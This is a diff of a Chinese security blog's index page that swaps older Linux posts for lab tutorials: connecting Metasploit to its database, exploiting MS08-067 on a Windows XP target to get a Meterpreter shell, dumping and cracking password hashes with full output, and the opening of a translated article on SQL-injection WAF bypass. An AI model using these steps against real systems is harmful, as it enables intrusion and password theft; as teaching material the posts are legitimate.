@@ -193,7 +193,7 @@
                 
                 <section class="switch-part switch-part2">
                     <div class="widget tagcloud" id="js-tagcloud">
-                        <a href="/tags/Docker/" style="font-size: 10px;">Docker</a> <a href="/tags/Python/" style="font-size: 15px;">Python</a> <a href="/tags/linux/" style="font-size: 17.5px;">linux</a> <a href="/tags/windows/" style="font-size: 12.5px;">windows</a> <a href="/tags/工具/" style="font-size: 10px;">工具</a> <a href="/tags/总结/" style="font-size: 10px;">总结</a> <a href="/tags/游戏/" style="font-size: 10px;">游戏</a> <a href="/tags/网络安全/" style="font-size: 20px;">网络安全</a> <a href="/tags/虚拟化/" style="font-size: 10px;">虚拟化</a> <a href="/tags/逆向破解/" style="font-size: 10px;">逆向破解</a>
+                        <a href="/tags/Docker/" style="font-size: 10px;">Docker</a> <a href="/tags/Python/" style="font-size: 16px;">Python</a> <a href="/tags/linux/" style="font-size: 18px;">linux</a> <a href="/tags/windows/" style="font-size: 14px;">windows</a> <a href="/tags/工具/" style="font-size: 10px;">工具</a> <a href="/tags/总结/" style="font-size: 10px;">总结</a> <a href="/tags/游戏/" style="font-size: 10px;">游戏</a> <a href="/tags/网络安全/" style="font-size: 20px;">网络安全</a> <a href="/tags/虚拟化/" style="font-size: 10px;">虚拟化</a> <a href="/tags/逆向破解/" style="font-size: 12px;">逆向破解</a>
                     </div>
                 </section>
                 
@@ -268,11 +268,11 @@
 </nav>
       <div class="body-wrap">
   
-    <article id="post-Centos6.5安装kvm虚拟化" class="article article-type-post" itemscope itemprop="blogPost">
+    <article id="post-启动数据库" class="article article-type-post" itemscope itemprop="blogPost">
   
     <div class="article-meta">
-      <a  href="/2018/01/28/Centos6.5安装kvm虚拟化/" class="article-date">
-      <time datetime="2018-01-28T06:45:52.000Z" itemprop="datePublished">2018-01-28</time>
+      <a  href="/2018/04/24/启动数据库/" class="article-date">
+      <time datetime="2018-04-24T06:45:46.000Z" itemprop="datePublished">2018-04-24</time>
 </a>
 
     </div>
@@ -286,7 +286,7 @@
         
   
     <h1 itemprop="name">
-      <a  class="article-title" href="/2018/01/28/Centos6.5安装kvm虚拟化/">Centos6.5安装kvm虚拟化</a>
+      <a  class="article-title" href="/2018/04/24/启动数据库/">Metsploit连接数据库</a>
     </h1>
   
 
@@ -297,111 +297,53 @@
     <div class="article-entry" itemprop="articleBody">
       
           
-        <p>KVM简介：<br>1.KVM是开源软件，全称是kernel-based virtual machine（基于内核的虚拟机）。<br>2.是x86架构且硬件支持虚拟化技术（如 intel VT 或 AMD-V）的Linux全虚拟化解决方案。<br>3.KVM能在不改变linux或windows镜像的情况下同时运行多个虚拟机，（它的意思是多个虚拟机使用同一镜像）并为每一个虚拟机配置个性化硬件环境（网卡、磁盘、图形适配器……）</p>
-<p>一、设置虚拟机支持虚拟化<br><img src="http://i2.51cto.com/images/blog/201801/28/0b3b950dae8251a522b6cdf7f61a81d1.jpg?x-oss-process=image/watermark,size_16,text_QDUxQ1RP5Y2a5a6i,color_FFFFFF,t_100,g_se,x_10,y_10,shadow_90,type_ZmFuZ3poZW5naGVpdGk=" alt=""></p>
-<p>二、先关闭防火墙和selinux</p>
-<pre><code>[root@cany ~]# service iptables stop    关闭防火墙
-[root@cany ~]# setenforce 0             关闭selinux（临时生效）
-setenforce: SELinux is disabled
-</code></pre><p>永久生效方法</p>
-<pre><code>[root@cany ~]# vim /etc/sysconfig/selinux   SELINUX=enforcing 改为disabled 并reboot生效
-</code></pre><p>三、检查服务器是否支持虚拟化</p>
-<pre><code>[root@cany ~]# grep -E -o &#39;vmx|svm&#39; /proc/cpuinfo
-vmx    如果有输出VMX就支持虚拟化
-</code></pre><p>四、安装KVM所需组件，VM使用桥接网络，使用yum安装方式（配置好yum源）</p>
-<pre><code>[root@cany ~]# yum install -y kvm virt-* libvirts bridge-utils qemu-img
-</code></pre><p>五、加载kvm模块，查看kvm模块是否被加载</p>
-<pre><code>[root@cany ~]# modprobe kvm-intel
-[root@cany ~]# lsmod | grep kvm
-kvm_intel             54285  0 
-kvm                    333172  1 kvm_intel     成功加载！
-</code></pre><p>六、配置网卡，具体参数如下<br>创建桥接网卡命令 ：  virsh  iface-bridge  eth0  br0  或者直接编辑网卡配置</p>
-<pre><code>[root@cany ~]# virsh iface-bridge eth0 br0     出现下面的错误 重启一下libvirt服务就好了
-error: Failed to reconnect to the hypervisor
-error: no valid connection
-error: Failed to connect socket to &#39;/var/run/libvirt/libvirt-sock&#39;: No such file or directory
-[root@cany ~]# /etc/init.d/libvirtd restart
-Stopping libvirtd daemon:                                  [  OK  ]
-Starting libvirtd daemon:                                  [  OK  ]
-[root@cany ~]# virsh iface-bridge eth0 br0
-Created bridge br0 with attached device eth0
-Bridge interface br0 started                              成功桥接
-[root@cany ~]# service network restart                    重启网卡
-</code></pre><p>此时的网卡信息</p>
-<p><img src="http://i2.51cto.com/images/blog/201801/28/ad19ad050b5787cf68d9f63c8f058651.jpg?x-oss-process=image/watermark,size_16,text_QDUxQ1RP5Y2a5a6i,color_FFFFFF,t_100,g_se,x_10,y_10,shadow_90,type_ZmFuZ3poZW5naGVpdGk=" alt=""><br>注意 ：因为eth0网卡因为与br0 网卡进行桥接，所以eth0不显示ip是正常的</p>
-<p>七、查看目前所有的网桥接口</p>
-<pre><code>[root@cany ~]# brctl show
-bridge name    bridge id        STP enabled    interfaces
-br0        8000.000c29eb8697    yes        eth0
-virbr0        8000.525400941201    yes        virbr0-nic
-</code></pre><p>八、修改VNC配置</p>
-<pre><code>[root@cany ~]#  vim /etc/libvirt/qemu.conf
-    #vnc_listen = &quot;0.0.0.0&quot;  去掉  # 号并wq保存
-</code></pre><p>九、重启libvirtd和messagebus服务</p>
-<pre><code>[root@cany ~]# service libvirtd restart
-Stopping libvirtd daemon:                                  [  OK  ]
-Starting libvirtd daemon:                                  [  OK  ]
-[root@cany ~]# service messagebus restart
-Stopping system message bus:                               [  OK  ]
-Starting system message bus:                               [  OK  ]
-</code></pre><p>十、创建、安装LVM虚拟机</p>
-<pre><code>[root@cany ~]# mkdir /abc         创建镜像存放目录
-[root@cany ~]# mkdir -p /data/kvm     创建虚拟磁盘存放目录
-[root@cany ~]# dd if=/dev/cdrom of=/abc/Centos6.iso  把Centos6.5系统的镜像文件拷贝到abc目录下
-8726528+0 records in
-8726528+0 records out
-4467982336 bytes (4.5 GB) copied, 157.25 s, 28.4 MB/s
-[root@cany libvirt]# cd /data/kvm/    进入虚拟磁盘目录创建img
-[root@cany kvm]# qemu-img create -f qcow2 -o preallocation=metadata kvm_cany.img 5G
-Formatting &#39;kvm_cany.img&#39;, fmt=qcow2 size=5368709120 encryption=off cluster_size=65536 preallocation=&#39;metadata&#39; 
-[root@cany kvm]# ls
-kvm_cany.img
-</code></pre><p>安装虚拟机</p>
-<pre><code>[root@cany kvm]# virt-install --name=kvm_cany --ram 512 --vcpus=1 -f /data/kvm/kvm_cany.img --cdrom=/abc/Centos6.iso --graphics vnc,listen=0.0.0.0,port=7788 --force --autostart
+        <h1 id="启动数据库"><a href="#启动数据库" class="headerlink" title="启动数据库"></a>启动数据库</h1><pre><code>root@kali:~# /etc/init.d/postgresql start
+</code></pre><h1 id="查看数据库配置信息"><a href="#查看数据库配置信息" class="headerlink" title="查看数据库配置信息"></a>查看数据库配置信息</h1><p>一般来说metsploit都会给你自动创建一个数据库，所以看着配置信息去连接就可以了</p>
+<pre><code>root@kali:~# vim /usr/share/metasploit-framework/config/database.yml
+</code></pre><p><img src="http://t1.aixinxi.net/o_1cbr5s93gsgdca31cnv1rhs5jta.png-j.jpg" alt=""><br>这个是我的配置文件的内容</p>
+<h1 id="连接数据库"><a href="#连接数据库" class="headerlink" title="连接数据库"></a>连接数据库</h1><p>个人建议创建两个窗口，对照着会比较方便</p>
+<pre><code>root@kali:~# msfconsole 
 
-Starting install...
-Creating domain...                                                                            |    0 B     00:00     
-Cannot open display: 
-Run &#39;virt-viewer --help&#39; to see a full list of available command line options
-Domain installation still in progress. You can reconnect to 
-the console to complete the installation process.
+ _                                                    _
+/ \    /\         __                         _   __  /_/ __
+| |\  / | _____   \ \           ___   _____ | | /  \ _   \ \
+| | \/| | | ___\ |- -|   /\    / __\ | -__/ | || | || | |- -|
+|_|   | | | _|__  | |_  / -\ __\ \   | |    | | \__/| |  | |_
+      |/  |____/  \___\/ /\ \\___/   \/     \__|    |_\  \___\
 
-如果遇到安装失败  请对虚拟磁盘存放目录权限  chmod -R 777 /data/kvm
-</code></pre><p>VNC客户端连接KVM虚拟机<br>软件：VNC Viewer<br><img src="http://i2.51cto.com/images/blog/201801/28/54a7da88e3f724c5c63042f2e7faee2e.jpg?x-oss-process=image/watermark,size_16,text_QDUxQ1RP5Y2a5a6i,color_FFFFFF,t_100,g_se,x_10,y_10,shadow_90,type_ZmFuZ3poZW5naGVpdGk=" alt=""><br><img src="http://i2.51cto.com/images/blog/201801/28/dc9de4664ac48791606d0f25be4eec28.jpg?x-oss-process=image/watermark,size_16,text_QDUxQ1RP5Y2a5a6i,color_FFFFFF,t_100,g_se,x_10,y_10,shadow_90,type_ZmFuZ3poZW5naGVpdGk=" alt=""><br>VNC连上了之后，安装系统就ok了！安装结束后，vnc会自动挂断，因为此时虚拟机并未启动！！！</p>
-<p>使用 virsh控制台为 KVM 系统管理若干任务 下面就让我们来手动开启刚刚安装的KVM虚拟机</p>
-<pre><code>[root@cany kvm]# virsh
-Welcome to virsh, the virtualization interactive terminal.
 
-Type:  &#39;help&#39; for help with commands
-       &#39;quit&#39; to quit
+       =[ metasploit v4.16.32-dev                         ]
++ -- --=[ 1726 exploits - 987 auxiliary - 300 post        ]
++ -- --=[ 507 payloads - 40 encoders - 10 nops            ]
++ -- --=[ Free Metasploit Pro trial: http://r-7.co/trymsp ]
 
-virsh # list --all
- Id    Name                           State
-----------------------------------------------------
- -     kvm_cany                       shut off
+msf &gt;
+msf &gt; db_connect msf:h6Ol63ydOISbgldkSsd8tmDkAgRPVgIEbz10YljkpGU=@localhost:5432/msf
+[*] Rebuilding the module cache in the background...
+msf &gt; creds 
+Credentials
+===========
 
-virsh # start kvm_cany
-Domain kvm_cany started
-</code></pre><p>重新使用VNC客户端进行连接 并对其网卡进行配置<br><img src="http://i2.51cto.com/images/blog/201801/28/4facaa82dfc9b1e4ff1268cba659d193.jpg?x-oss-process=image/watermark,size_16,text_QDUxQ1RP5Y2a5a6i,color_FFFFFF,t_100,g_se,x_10,y_10,shadow_90,type_ZmFuZ3poZW5naGVpdGk=" alt=""></p>
-<p>注意：出现网卡重启失败的话 将eth0网卡配置文件中的 HWADDR修改成MACADDR</p>
-<pre><code>rm -rf /etc/udev/rules.d/70-persistent-net.rules
-</code></pre><p>在虚拟机上查看KVM虚拟机运行状态</p>
-<p><img src="http://i2.51cto.com/images/blog/201801/28/07d23ebb9c759d541ba499f65a05dbe5.jpg?x-oss-process=image/watermark,size_16,text_QDUxQ1RP5Y2a5a6i,color_FFFFFF,t_100,g_se,x_10,y_10,shadow_90,type_ZmFuZ3poZW5naGVpdGk=" alt=""></p>
+host       origin     service           public  private  realm        private_type
+----       ------     -------           ------  -------  -----        ------------
+x.x.x.x  x.x.x.x  1433/tcp (mssql)  sa      123456   WORKSTATION  Password
 
+msf &gt;
+</code></pre><p>数据库连接完成，但是有的会开启msf后自动连接数据库，所以可以先查看数据库状态</p>
+<pre><code>msf &gt; db_status 
+[*] postgresql connected to msf
+msf &gt;
+</code></pre>
       
     </div>
     
     <div class="article-info article-info-index">
       
       
-    <div class="article-category tagcloud">
-    <a class="article-category-link" href="/categories/linux/">linux</a>
-    </div>
-
 
       
     <div class="article-tag tagcloud">
-        <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/linux/">linux</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/虚拟化/">虚拟化</a></li></ul>
+        <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/linux/">linux</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/网络安全/">网络安全</a></li></ul>
     </div>
 
       
@@ -423,11 +365,11 @@ Domain kvm_cany started
 
 
   
-    <article id="post-为各版本linux添加yum源" class="article article-type-post" itemscope itemprop="blogPost">
+    <article id="post-metsploit获取电脑密码" class="article article-type-post" itemscope itemprop="blogPost">
   
     <div class="article-meta">
-      <a  href="/2018/01/28/为各版本linux添加yum源/" class="article-date">
-      <time datetime="2018-01-28T02:00:52.000Z" itemprop="datePublished">2018-01-28</time>
+      <a  href="/2018/04/24/metsploit获取电脑密码/" class="article-date">
+      <time datetime="2018-04-24T06:27:02.000Z" itemprop="datePublished">2018-04-24</time>
 </a>
 
     </div>
@@ -441,7 +383,7 @@ Domain kvm_cany started
         
   
     <h1 itemprop="name">
-      <a  class="article-title" href="/2018/01/28/为各版本linux添加yum源/">为各版本linux添加yum源</a>
+      <a  class="article-title" href="/2018/04/24/metsploit获取电脑密码/">Metsploit破解hash</a>
     </h1>
   
 
@@ -452,28 +394,98 @@ Domain kvm_cany started
     <div class="article-entry" itemprop="articleBody">
       
           
-        <p>这里我就以Centos 6.5 来做演示 首先先百度下对应版本的yun源</p>
-<p>国内比较好的yum源主要是阿里云、163以及搜狐的，更新yum的命令如下：</p>
-<pre><code>//更新为阿里云的源
+        <h1 id="metsploit获取电脑密码"><a href="#metsploit获取电脑密码" class="headerlink" title="metsploit获取电脑密码"></a>metsploit获取电脑密码</h1><p>首先简单介绍一下metsploit这个工具，它是一款开源的安全漏洞检测工具，你可以利用这个工具中的模块，来对目标服务器进行渗透测试，例如经典的ms08_067等</p>
+<h2 id="开启软件"><a href="#开启软件" class="headerlink" title="开启软件"></a>开启软件</h2><p>攻击机: Kali Linux<br>靶机: WindowsXP SP1<br>软件版本: 4.16.32</p>
+<p>命令:</p>
+<pre><code>root@kali:~# msfconsole
+</code></pre><p><img src="http://t1.aixinxi.net/o_1cbqitmj21s00vhh1mm816o13soa.png-j.jpg" alt="应用截图"></p>
+<h2 id="开始实验"><a href="#开始实验" class="headerlink" title="开始实验"></a>开始实验</h2><p>这次实验就用ms08067模块的来测试，若觉得过于无聊像直接跳到破解hash，可以直接跳到相应环节，那么，首先先查询模块的位置</p>
+<pre><code>msf &gt; search ms08_067
+</code></pre><p><img src="http://t1.aixinxi.net/o_1cbqjaf2m1lbih2f1n8c1ukp11poa.png-j.jpg" alt=""><br>可以看到这个模块是在exploit/windows/smb/下的，接着用use命令去使用它，然后show options 来查看需要配置的选项</p>
+<pre><code>msf &gt; use exploit/windows/smb/ms08_067_netapi 
+msf exploit(windows/smb/ms08_067_netapi) &gt; show options
 
-wget -O /etc/yum.repos.d/CentOS-Base.repo http://mirrors.aliyun.com/repo/Centos-6.repo
+Module options (exploit/windows/smb/ms08_067_netapi):
 
-//更新为163的源
-wget -O /etc/yum.repos.d/CentOS-Base.repo http://mirrors.163.com/.help/CentOS6-Base-163.repo
+   Name     Current Setting  Required  Description
+   ----     ---------------  --------  -----------
+   RHOST                     yes       The target address
+   RPORT    445              yes       The SMB service port (TCP)
+   SMBPIPE  BROWSER          yes       The pipe name to use (BROWSER, SRVSVC)
 
-//更新为搜狐的源
-wget -O /etc/yum.repos.d/CentOS-Base.repo http://mirrors.sohu.com/help/CentOS-Base-sohu.repo
-</code></pre><p>1.进入yum源配置目录</p>
-<pre><code> cd /etc/yum.repos.d
-</code></pre><p>2.做什么改动前最后都做个备份 以防出错 还能恢复</p>
-<pre><code>mv CentOS-Base.repo CentOS-Base.repo.bak
-</code></pre><p>3.下载新的CentOS-Base.repo 到/etc/yum.repos.d/</p>
-<pre><code>wget -O /etc/yum.repos.d/CentOS-Base.repo http://mirrors.aliyun.com/repo/Centos-6.repo
-</code></pre><p>4.运行yum makecache生成缓存</p>
-<pre><code>yum clean all
-yum makecache
-</code></pre><hr>
-<p>本文是转载@Han的文章，如需转载，请注明出处。否则将追究法律责任<br>Han’s Blog: <a href="http://hanq.top" target="_blank" rel="noopener">http://hanq.top</a></p>
+
+Exploit target:
+
+   Id  Name
+   --  ----
+   0   Automatic Targeting
+
+
+msf exploit(windows/smb/ms08_067_netapi) &gt;
+</code></pre><p>设置目标IP</p>
+<pre><code>msf exploit(windows/smb/ms08_067_netapi) &gt; set rhost x.x.x.x
+</code></pre><p>设置完后，就可以开始攻击了</p>
+<pre><code>msf exploit(windows/smb/ms08_067_netapi) &gt; exploit 
+
+[*] Started reverse TCP handler on x.x.x.x:4444 
+[*] x.x.x.x:445 - Automatically detecting the target...
+[*] x.x.x.x:445 - Fingerprint: Windows XP - Service Pack 0 / 1 - lang:English
+[*] x.x.x.x:445 - Selected Target: Windows XP SP0/SP1 Universal
+[*] x.x.x.x:445 - Attempting to trigger the vulnerability...
+[*] Sending stage (179779 bytes) to x.x.x.x
+[*] Meterpreter session 1 opened (x.x.x.x:4444 -&gt; x.x.x.x:1040) at 2018-04-24 17:15:53 +0800
+
+meterpreter &gt;
+</code></pre><p>成功，这个时候我们就可以一定程度的为所欲为了，可以进行下一步，也就是本篇的主题了</p>
+<h2 id="破解hash密码"><a href="#破解hash密码" class="headerlink" title="破解hash密码"></a>破解hash密码</h2><p>先在对方电脑上留一个会话，方便再次进入</p>
+<pre><code>meterpreter &gt; background 
+[*] Backgrounding session 1...
+msf exploit(windows/smb/ms08_067_netapi) &gt;
+</code></pre><p>然后进行下一步,hashdump(PS:这一步需要连接metsploit的数据库，可以移步另一篇)</p>
+<pre><code>msf exploit(windows/smb/ms08_067_netapi) &gt; use post/windows/gather/hashdump 
+msf post(windows/gather/hashdump) &gt; set session 1
+session =&gt; 1
+msf post(windows/gather/hashdump) &gt; exploit 
+
+[*] Obtaining the boot key...
+[*] Calculating the hboot key using SYSKEY 428e28b631cc943839d3825b82f120d5...
+[*] Obtaining the user list and keys...
+[*] Decrypting user keys...
+[*] Dumping password hints...
+[*] Dumping password hashes...
+
+Administrator:500:a1ee20c00c723dd2aad3b435b51404ee:2faf5f4a6e588f18f1f84616da5ba9a7:::
+Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+HelpAssistant:1000:5e524bae58d900e05d22d4ead5281bca:702eed191404bc7a910cf5e551cd6f3b:::
+SUPPORT_388945a0:1002:aad3b435b51404eeaad3b435b51404ee:202d3a3a623de3bbc30ab1c2784d0102:::
+hacker:1004:1f27acde849935b0aad3b435b51404ee:579110c49145015c47ecd267657d3174:::
+
+
+[*] Post module execution completed
+</code></pre><p>利用jtr_crack_fast模块来爆破密码</p>
+<pre><code>msf post(windows/gather/hashdump) &gt; use auxiliary/analyze/jtr_crack_fast
+msf auxiliary(analyze/jtr_crack_fast) &gt; exploit 
+
+[*] Wordlist file written out to /tmp/jtrtmp20180424-3414-19br28b
+[*] Hashes Written out to /tmp/hashes_tmp20180424-3414-nv7b02
+[*] Cracking lm hashes in normal wordlist mode...
+Created directory: /root/.john
+[*] Loaded 5 password hashes with no different salts (LM [DES 128/128 AVX-16])
+Press &#39;q&#39; or Ctrl-C to abort, almost any other key for status
+[*] 123123           (hacker)
+[*] FRANK            (administrator)
+2g 0:00:00:00 DONE (Tue Apr 24 17:53:06 2018) 22.22g/s 857544p/s 857544c/s 2599KC/s ZIRCON..VAGRANT
+
+Warning: passwords printed above might be partial and not be all those cracked
+Use the &quot;--show&quot; option to display all of the cracked passwords reliably
+Session completed
+
+[*] Cracked Passwords this run:
+[+] administrator:frank:2:2
+[+] hacker:123123:6:6
+[*] Auxiliary module execution completed
+msf auxiliary(analyze/jtr_crack_fast) &gt;
+</code></pre><p>可以看到，密码已经出来了,administrator的密码为frank，完成</p>
 
       
     </div>
@@ -481,14 +493,10 @@ yum makecache
     <div class="article-info article-info-index">
       
       
-    <div class="article-category tagcloud">
-    <a class="article-category-link" href="/categories/linux/">linux</a>
-    </div>
-
 
       
     <div class="article-tag tagcloud">
-        <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/linux/">linux</a></li></ul>
+        <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/linux/">linux</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/网络安全/">网络安全</a></li></ul>
     </div>
 
       
@@ -510,11 +518,11 @@ yum makecache
 
 
   
-    <article id="post-NTFS 数据隐藏及恢复" class="article article-type-post" itemscope itemprop="blogPost">
+    <article id="post-python日志" class="article article-type-post" itemscope itemprop="blogPost">
   
     <div class="article-meta">
-      <a  href="/2018/01/27/NTFS 数据隐藏及恢复/" class="article-date">
-      <time datetime="2018-01-27T12:48:52.000Z" itemprop="datePublished">2018-01-27</time>
+      <a  href="/2018/03/20/python日志/" class="article-date">
+      <time datetime="2018-03-20T01:53:55.000Z" itemprop="datePublished">2018-03-20</time>
 </a>
 
     </div>
@@ -528,7 +536,7 @@ yum makecache
         
   
     <h1 itemprop="name">
-      <a  class="article-title" href="/2018/01/27/NTFS 数据隐藏及恢复/">NTFS 数据隐藏及恢复</a>
+      <a  class="article-title" href="/2018/03/20/python日志/">Python学习日志</a>
     </h1>
   
 
@@ -539,7 +547,7 @@ yum makecache
     <div class="article-entry" itemprop="articleBody">
       
           
-              <!--more-->
+              前言：本文的内容是由[Elapse]和[Asolmn]共同编写，内容更新全看我俩什么时候脑袋一抽学Python，本文不具备专业性，仅供自己学习，在特别的块因为使用的Python版本不同，所以个别会标明版本，并在后期逐渐完善全版本
           
       
     </div>
@@ -548,18 +556,18 @@ yum makecache
       
       
     <div class="article-category tagcloud">
-    <a class="article-category-link" href="/categories/windows/">windows</a>
+    <a class="article-category-link" href="/categories/Python/">Python</a>
     </div>
 
 
       
     <div class="article-tag tagcloud">
-        <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/windows/">windows</a></li></ul>
+        <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Python/">Python</a></li></ul>
     </div>
 
       
         <p class="article-more-link">
-          <a   href="/2018/01/27/NTFS 数据隐藏及恢复/#more">查看更多 >></a>
+          <a   href="/2018/03/20/python日志/#more">查看更多 >></a>
         </p>
       
       <div class="clearfix"></div>
@@ -580,11 +588,11 @@ yum makecache
 
 
   
-    <article id="post-FAT32 数据隐藏及恢复" class="article article-type-post" itemscope itemprop="blogPost">
+    <article id="post-SQL injection" class="article article-type-post" itemscope itemprop="blogPost">
   
     <div class="article-meta">
-      <a  href="/2018/01/27/FAT32 数据隐藏及恢复/" class="article-date">
-      <time datetime="2018-01-27T11:11:52.000Z" itemprop="datePublished">2018-01-27</time>
+      <a  href="/2018/03/14/SQL injection/" class="article-date">
+      <time datetime="2018-03-14T04:41:31.000Z" itemprop="datePublished">2018-03-14</time>
 </a>
 
     </div>
@@ -598,7 +606,7 @@ yum makecache
         
   
     <h1 itemprop="name">
-      <a  class="article-title" href="/2018/01/27/FAT32 数据隐藏及恢复/">FAT32 数据隐藏及恢复</a>
+      <a  class="article-title" href="/2018/03/14/SQL injection/">SQL injection bypass WAF</a>
     </h1>
   
 
@@ -609,34 +617,102 @@ yum makecache
     <div class="article-entry" itemprop="articleBody">
       
           
-        <ol>
-<li>Winhex  链接：<a href="https://pan.baidu.com/s/1dHevDnz" target="_blank" rel="noopener">https://pan.baidu.com/s/1dHevDnz</a> 密码：4zsi</li>
-<li>软件注册码 ZYCX2014shujuhuifu</li>
-</ol>
-<p>打开软件 选择红标处</p>
-<p><img src="http://i2.51cto.com/images/blog/201801/27/561181cb0b2ad66d74e7da5a3fc50a2e.jpg?x-oss-process=image/watermark,size_16,text_QDUxQ1RP5Y2a5a6i,color_FFFFFF,t_100,g_se,x_10,y_10,shadow_90,type_ZmFuZ3poZW5naGVpdGk=" alt=""></p>
-<p>选择你的磁盘 这里我就用u盘演示</p>
-<p><img src="http://i2.51cto.com/images/blog/201801/27/843de8190f8687c2b5f9926f8ee6e418.jpg?x-oss-process=image/watermark,size_16,text_QDUxQ1RP5Y2a5a6i,color_FFFFFF,t_100,g_se,x_10,y_10,shadow_90,type_ZmFuZ3poZW5naGVpdGk=" alt=""></p>
-<p>如有出现下图 就选择红标处  这是更新磁盘快照</p>
-<p><img src="http://i2.51cto.com/images/blog/201801/27/1707ed89deb20283a86256254dbfad06.jpg?x-oss-process=image/watermark,size_16,text_QDUxQ1RP5Y2a5a6i,color_FFFFFF,t_100,g_se,x_10,y_10,shadow_90,type_ZmFuZ3poZW5naGVpdGk=" alt=""></p>
-<p>这里我想隐藏掉winhex.exe 然后我们按下图所示选择 转到目录条目</p>
-<p><img src="http://i2.51cto.com/images/blog/201801/27/9f0c728443cd83a61f86491d900daed7.jpg?x-oss-process=image/watermark,size_16,text_QDUxQ1RP5Y2a5a6i,color_FFFFFF,t_100,g_se,x_10,y_10,shadow_90,type_ZmFuZ3poZW5naGVpdGk=" alt=""></p>
-<p>跳转到16进制 跳到哪里就拉取选择本行和下一行并复制（Ctrl+C）  如下图所示</p>
-<p><img src="http://i2.51cto.com/images/blog/201801/27/5595efd13d266978864cfe6b6f652813.jpg?x-oss-process=image/watermark,size_16,text_QDUxQ1RP5Y2a5a6i,color_FFFFFF,t_100,g_se,x_10,y_10,shadow_90,type_ZmFuZ3poZW5naGVpdGk=" alt=""></p>
-<p>选择下方空白区域就粘贴  此处注意：点击第一个数就Ctrl+B就可以粘贴了</p>
-<p><img src="http://i2.51cto.com/images/blog/201801/27/1a901715206ea229faede3161eb826de.jpg?x-oss-process=image/watermark,size_16,text_QDUxQ1RP5Y2a5a6i,color_FFFFFF,t_100,g_se,x_10,y_10,shadow_90,type_ZmFuZ3poZW5naGVpdGk=" alt=""></p>
-<p>再把原来的数据区域Crtl+L填充为0 然后Crtl+B保存修改</p>
-<p><img src="http://i2.51cto.com/images/blog/201801/27/d32f747ecd4198f080e39d4d24259ce4.jpg?x-oss-process=image/watermark,size_16,text_QDUxQ1RP5Y2a5a6i,color_FFFFFF,t_100,g_se,x_10,y_10,shadow_90,type_ZmFuZ3poZW5naGVpdGk=" alt=""></p>
-<p>此时我们的winhex.exe 就被隐藏啦</p>
-<p><img src="http://i2.51cto.com/images/blog/201801/27/14215c16714c4f225d95fb5567e27119.jpg?x-oss-process=image/watermark,size_16,text_QDUxQ1RP5Y2a5a6i,color_FFFFFF,t_100,g_se,x_10,y_10,shadow_90,type_ZmFuZ3poZW5naGVpdGk=" alt=""></p>
-<p>恢复就把刚才的数据填充到原来的位置 并把现在的填充为0</p>
-<p><img src="http://i2.51cto.com/images/blog/201801/27/892d9652e18347d5368ee1f8f58cafcb.jpg?x-oss-process=image/watermark,size_16,text_QDUxQ1RP5Y2a5a6i,color_FFFFFF,t_100,g_se,x_10,y_10,shadow_90,type_ZmFuZ3poZW5naGVpdGk=" alt=""></p>
-<p>教程到此就结束啦</p>
-<blockquote>
-<p>为什么会带着password.txt一起隐藏了？<br>答：因为FAT格式只检查到空白处就不会往下检查 所以要把下面那段数据填充 如有多的文件要隐藏  肯定是放文件夹啦 隐藏及恢复同理</p>
+        <h1 id="SQL-injection-9-ways-to-bypass-Web-Application-Firewall"><a href="#SQL-injection-9-ways-to-bypass-Web-Application-Firewall" class="headerlink" title="SQL injection: 9 ways to bypass Web Application Firewall"></a>SQL injection: 9 ways to bypass Web Application Firewall</h1><blockquote>
+<p>本文转载至 <a href="https://www.digitalmunition.me/2018/02/sql-injection-9-ways-bypass-web-application-firewall/" target="_blank" rel="noopener">https://www.digitalmunition.me/2018/02/sql-injection-9-ways-bypass-web-application-firewall/</a> ，为翻译作品，限于我的英语水平有限，所以文章将保留英文，侵删</p>
 </blockquote>
+<h2 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h2><p>A web application firewall (or WAF) filters, monitors, and blocks HTTP traffic to and from a web application. A WAF is differentiated from a regular firewall in that a WAF is able to filter the content of specific web applications while regular firewalls serve as a safety gate between servers. By inspecting HTTP traffic, it can prevent attacks stemming from web application security flaws, such as SQL injection, cross-site scripting (XSS), file inclusion, and security misconfigurations.</p>
+<blockquote>
+<p>Web应用防护系统(也称:网站应用级入侵防御系统)能过滤、监视和阻止Web应用程序之间的HTTP通信。WAF跟常规的防火墙是有区别的，因为WAF能够过滤特定Web应用程序的内容，而常规防火墙则是服务器之间的安全门。通过检查HTTP流量等，它可以防止源自Web应用程序安全漏洞（如SQL注入，跨站点脚本（XSS），文件包含和安全性错误配置）的攻击。</p>
+</blockquote>
+<h2 id="WAF是如何工作的"><a href="#WAF是如何工作的" class="headerlink" title="WAF是如何工作的"></a>WAF是如何工作的</h2><ul>
+<li>Exception Detection Protocol: Denies requests that do not meet HTTP standards<blockquote>
+<p>检测异常的协议:拒绝不符合HTTP标准的请求</p>
+</blockquote>
+</li>
+<li>Enhanced input validation: Proxy and server-side validation, not just client-side validation<blockquote>
+<p>加强了输入验证:在代理和服务器端验证，而不仅仅只是在客户端验证</p>
+</blockquote>
+</li>
+<li>WhiteList &amp; Blacklist<blockquote>
+<p>白名单和黑名单</p>
+</blockquote>
+</li>
+<li>Rule-based and exception-based protection: more black-based mechanisms based on rules, more flexible based on exceptions<blockquote>
+<p>不同于一般规则的规则可能会比一般规则更加灵活有用，如黑名单规则</p>
+</blockquote>
+</li>
+<li>State management: focus on session protectionThere are also: Cookies protection, anti-intrusion avoidance technology, response monitoring and information disclosure protection.<blockquote>
+<p>状态管理:会话保护，Cookie保护，反入侵规避技术，响应监控和信息披露保护。</p>
+</blockquote>
+</li>
+</ul>
+<h2 id="如何绕过WAF"><a href="#如何绕过WAF" class="headerlink" title="如何绕过WAF"></a>如何绕过WAF</h2><p>1.Mixed CaseChange case of malicious input triggering WAF protections. union may become uNIoN, If the WAF is using a case sensitive blacklist, changing case may bypass that filter.</p>
+<blockquote>
